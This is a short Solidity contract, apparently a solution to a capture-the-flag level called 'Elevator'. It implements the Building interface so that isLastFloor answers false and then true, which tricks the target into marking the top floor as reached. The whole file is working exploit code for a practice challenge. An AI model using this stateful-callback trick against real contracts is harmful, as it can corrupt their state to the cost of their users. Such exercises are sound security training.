// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorAttack is Building {
    
    bool public entered;
    Elevator public contractTarget;
    constructor(address _contractTargetAddr) public {
        entered = false;
        contractTarget = Elevator(_contractTargetAddr);
    }
    
    function isLastFloor(uint) external override returns (bool){
        if(!entered)
        {
            entered = true;
            return false;
        }
        return entered;
    }

    function callGoto() external {
        contractTarget.goTo(4);
    }
}